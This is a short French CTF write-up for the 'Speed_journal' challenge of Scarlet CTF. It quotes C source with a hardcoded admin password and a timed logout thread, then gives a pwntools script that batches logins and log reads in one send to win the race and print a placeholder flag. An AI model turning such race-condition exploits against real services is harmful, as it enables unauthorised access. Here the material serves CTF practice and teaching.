+++
date = '2026-01-13T08:55:50+01:00'
draft = false
title = 'Speed_journal'
+++


<div class="attachments">
  <a href="/ctf/scarletctf_01_26">Scarlet CTF</a><br><br>
  <a href="/ctf/scarletctf_01_26/ruid_login/Makefile">Makefile</a><br>
  <a href="/ctf/scarletctf_01_26/ruid_login/speedjournal">speedjournal</a><br>
  <a href="/ctf/scarletctf_01_26/ruid_login/speedjournal.c">speedjournal.c</a><br>
  <a href="/ctf/scarletctf_01_26/ruid_login/solve.py">solve.py</a><br>
</div>

Tout est dans le titre, 

une fonction nous permet de se connecter en admin:

```C
void login_admin() {
    char pw[32];
    printf("Admin password: ");
    fgets(pw, sizeof(pw), stdin);

    if (strncmp(pw, "supersecret\n", 12) == 0) {
        is_admin = 1;

        pthread_t t;
        pthread_create(&t, NULL, logout_thread, NULL);
        pthread_detach(t);

        puts("[+] Admin logged in (temporarily)");
    } else {
        puts("[-] Wrong password");
    }
}
```

Une autre nous permet de lire un flag:

```C
void read_log() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    getchar();

    if (idx < 0 || idx >= log_count) {
        puts("Invalid index");
        return;
    }

    if (logs[idx].restricted && !is_admin) {
        puts("Access denied");
        return;
    }

    printf("Log: %s\n", logs[idx].content);
}
```

mais le flag admin est protégé:

```C
int main(){
    ...
    strcpy(logs[0].content, "RUSEC{xxxxxxxxxxxxxxxxxxxxx}\n");
    logs[0].restricted = 1;
    log_count = 1;
    ...
}

```

On va donc se connecter et afficher le flag le plus vite possible,
pour ça on ne va pas envoyer notre payload petit à petit comme à l'accoutumée,
mais le construire d'abord et tout envoyer d'un coup:

```python
from pwn import *

io = process("./speedjournal")
# io = remote("challs.ctf.rusec.club", 22169)

pl = b""
pl += b"0\naaa\n"
for i in range(10):
    # connection admin
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    # écrire un log qu'on pourra lire
    pl += b"3\n1\n"
    # connection admin
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    # lecture du flag
    pl += b"3\n0\n"
    # connection admin
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"

sleep(1)
io.sendline(pl)

io.interactive()
```
```bash
1. Login admin
2. Write log
3. Read log
4. Exit
> Index: Log: RUSEC{xxxxxxxxxxxxxxxxxxxxx}
```

Thx.
<br>
Sk4r.